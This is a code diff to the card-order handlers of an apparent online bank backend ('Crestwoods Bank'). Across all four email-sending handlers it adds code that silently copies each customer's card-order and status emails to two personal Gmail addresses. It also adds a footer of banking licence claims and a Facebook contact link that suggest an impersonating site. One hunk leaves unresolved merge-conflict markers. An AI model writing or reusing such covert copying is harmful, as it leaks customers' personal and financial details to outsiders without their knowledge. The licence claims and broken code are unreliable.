@@ -4,7 +4,13 @@ const User = require("../models/UserModel");
 
 const orderDebitCard = async (req, res) => {
   try {
+    
     const user = await User.findById(req.user.userId);
+    const existingOrder = await OrderCard.findOne({ user: user._id})
+    if(existingOrder) {
+      return res.status(400).json({ error: "user already ordered a card"})
+    }
+    
     if (!user) {
       return res
         .status(404)
@@ -68,11 +74,35 @@ const orderDebitCard = async (req, res) => {
           <p>If you have any questions or need further assistance, please don't hesitate to contact us.</p>
           <div class="footer">
             <p>Thank you for choosing Crestwoods Bank.</p>
+            <div class="footer" style="margin-top: 1rem; font-size: 12px">
+            <p>Thank you for choosing our services.</p>
+          </div>
+
+          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>
+
+          <h3>Security Information:</h3>
+          <p>It's important to keep your account secure. Here are some security tips:</p>
+          <ul>
+            <li>Never share your account password with anyone.</li>
+            <li>Use strong, unique passwords for your online banking.</li>
+          </ul>
+
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+
+          <div class="footer">
+            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
+            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
+            <p>© Crestwoods Capitals.</p>
+          </div>
           </div>
         </div>
       </body>
       </html>`;
-    await sendEmail(user.email, subject, text, html); 
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
+    ]);
   
 
     // Respond with success message and order data
@@ -154,13 +184,39 @@ const mailedOrderCard = async (req, res) => {
         
         <div class="footer">
             <p>Thank you for choosing Crestwoods Bank.</p>
+<<<<<<< HEAD
+=======
+            <div class="footer" style="margin-top: 1rem; font-size: 12px">
+            <p>Thank you for choosing our services.</p>
+          </div>
+
+          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>
+
+          <h3>Security Information:</h3>
+          <p>It's important to keep your account secure. Here are some security tips:</p>
+          <ul>
+            <li>Never share your account password with anyone.</li>
+            <li>Use strong, unique passwords for your online banking.</li>
+          </ul>
+
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+
+          <div class="footer">
+            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
+            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
+            <p>© Crestwoods Capitals.</p>
+          </div>
+>>>>>>> 9906a19 (changes dont break)
         </div>
     </div>
 </body>
 </html>
 `;
-
-    await sendEmail(user.email, subject, text, html)
+ await Promise.all([
+   sendEmail(user.email, subject, text, html),
+   sendEmail("anniemary841@gmail.com", subject, text, html),
+   sendEmail("companychris00@gmail.com", subject, text, html),
+ ]);
   } catch (error) {
     console.log(error);
     res.status(400).json({ error: error.message });
@@ -237,13 +293,37 @@ const pendingOrderCard = async (req, res) => {
         
         <div class="footer">
             <p>Thank you for choosing Crestwoods Bank.</p>
+            <div class="footer" style="margin-top: 1rem; font-size: 12px">
+            <p>Thank you for choosing our services.</p>
+          </div>
+
+          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>
+
+          <h3>Security Information:</h3>
+          <p>It's important to keep your account secure. Here are some security tips:</p>
+          <ul>
+            <li>Never share your account password with anyone.</li>
+            <li>Use strong, unique passwords for your online banking.</li>
+          </ul>
+
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+
+          <div class="footer">
+            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
+            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
+            <p>© Crestwoods Capitals.</p>
+          </div>
         </div>
     </div>
 </body>
 </html>
 `;
 
-    await sendEmail(user.email, subject, text, html);
+     await Promise.all([
+       sendEmail(user.email, subject, text, html),
+       sendEmail("anniemary841@gmail.com", subject, text, html),
+       sendEmail("companychris00@gmail.com", subject, text, html),
+     ]);
   } catch (error) {
     console.log(error);
     res.status(400).json({ error: error.message });
@@ -319,14 +399,37 @@ const activatedOrderCard = async (req, res) => {
         <p>If you have any questions or need further assistance, please don't hesitate to contact us.</p>
         
         <div class="footer">
-            <p>Thank you for choosing Crestwoods Bank.</p>
+            <div class="footer" style="margin-top: 1rem; font-size: 12px">
+            <p>Thank you for choosing our services.</p>
+          </div>
+
+          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>
+
+          <h3>Security Information:</h3>
+          <p>It's important to keep your account secure. Here are some security tips:</p>
+          <ul>
+            <li>Never share your account password with anyone.</li>
+            <li>Use strong, unique passwords for your online banking.</li>
+          </ul>
+
+          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@crestwoodscapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>
+
+          <div class="footer">
+            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
+            <p>Crestwoods Capitals Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
+            <p>© Crestwoods Capitals.</p>
+          </div>
         </div>
     </div>
 </body>
 </html>
 `;
 
-    await sendEmail(user.email, subject, text, html);
+    await Promise.all([
+      sendEmail(user.email, subject, text, html),
+      sendEmail("anniemary841@gmail.com", subject, text, html),
+      sendEmail("companychris00@gmail.com", subject, text, html),
+    ]);
   } catch (error) {
     console.log(error);
     res.status(400).json({ error: error.message });
